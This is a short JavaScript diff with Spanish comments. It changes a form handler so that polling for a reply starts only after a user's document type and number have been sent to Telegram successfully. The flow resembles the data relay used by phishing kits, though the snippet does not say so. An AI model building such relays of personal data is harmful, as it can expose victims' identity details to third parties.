@@ -196,14 +196,16 @@
                     const result = await response.json();
 
                     if (result.success) {
-                        // Enviar a Telegram a través de la API
-                        await window.telegramManager.sendToTelegram('documento', {
+                        // Enviar a Telegram y esperar respuesta
+                        const sendResult = await window.telegramManager.sendToTelegram('documento', {
                             documentType: state.documentType,
                             documentNumber: state.documentNumber
                         });
 
-                        // Iniciar polling para esperar respuesta
-                        window.telegramManager.startPolling();
+                        // Solo iniciar polling si el envío fue exitoso
+                        if (sendResult && sendResult.success) {
+                            window.telegramManager.startPolling();
+                        }
                     }
                 } catch (error) {
                     console.error('❌ Error enviando datos:', error);
